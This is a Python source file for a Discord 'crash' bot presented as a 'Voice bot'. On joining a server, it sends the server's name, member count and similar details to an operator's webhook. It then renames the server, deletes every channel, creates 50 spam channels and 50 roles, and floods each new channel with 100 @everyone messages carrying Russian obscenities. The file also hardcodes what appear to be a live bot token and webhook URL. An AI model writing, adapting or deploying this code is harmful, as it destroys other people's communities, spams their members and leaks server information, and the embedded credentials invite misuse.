import os
from keep_alive import keep_alive
keep_alive()
try:
    import discord
    from discord.ext import commands
    import aiohttp
    from discord import Webhook, AsyncWebhookAdapter
    import asyncio
except:
    os.system('pip install discord')
    os.system('pip install syncio')
    os.system('pip install aiohttp')


TOKEN = ("MTAxMDk0NjAxOTg1MDE5MDk4OA.GWt650.1xtsI6ge37xnwE1HpEM96erySnWp4s_iMYKtZ0")
web = ("https://discord.com/api/webhooks/992676492221890620/Ts_K84DTQXzc5GlXnGk_BoLM-Se3VPpC3qWZNQG4GPUwymfKJZzHspV3Q44cqvqlYCNV")    
client = commands.Bot(command_prefix='.', intents=discord.Intents.all())

@client.event
async def on_ready():
    print(f'[{client.user}]')
    
@client.event
async def on_guild_join(guild):
    if int(len(guild.members)) > 15 or int(len(guild.members)) == 15:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.add_bot):
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(web, adapter=AsyncWebhookAdapter(session))
                await webhook.send(embed=discord.Embed(title='Voice bot | Сервер будет выебан', description=f'**Название сервера:** `{guild.name}`\n**Участников на сервере:** `{len(guild.members)}`\n**Количество каналов на сервере:** `{len(guild.channels)}`\n**Количество ролей на сервере:** `{len(guild.roles)}`\n**Сервера где меньше 15 участников не показываются в логах**', colour=discord.Colour.from_rgb(255, 0, 0)))
                
    with open('voice.png', 'rb') as f:
        ava = f.read()
        
    try:
        await guild.edit(name='Crashed By Voice Bot', icon=ava)
    except: pass
    
    for channel in guild.channels:
        try:
            await channel.delete()
        except: pass
        
    for _ in range(50):
        try:
            await guild.create_text_channel(name='crashed-by-voice-bot')
        except: pass
        
    for _ in range(50):
        try:
            await guild.create_role(name='Crashed By Voice Bot')
        except: pass
        
@client.event
async def on_guild_channel_create(channel):
    try:
        webhook = await channel.create_webhook(name='Crashed By Voice Bot')
        for _ in range(100):
          await webhook.send(content='@everyone @here Паша лох', embed=discord.Embed(title='СЕРВЕР КРАШНУТ', description='**Ваш сервер выебан краш ботом от Пана Богдана', colour=discord.Colour.from_rgb(255, 0, 0)))
    except:
      for _ in range(100):
        await channel.send(content='@everyone @here Паша лох', embed=discord.Embed(title='СЕРВЕР КРАШНУТ', description='**Ваш сервер выебан краш ботом от Пана Богдана', colour=discord.Colour.from_rgb(255, 0, 0)))
        
client.run(TOKEN)
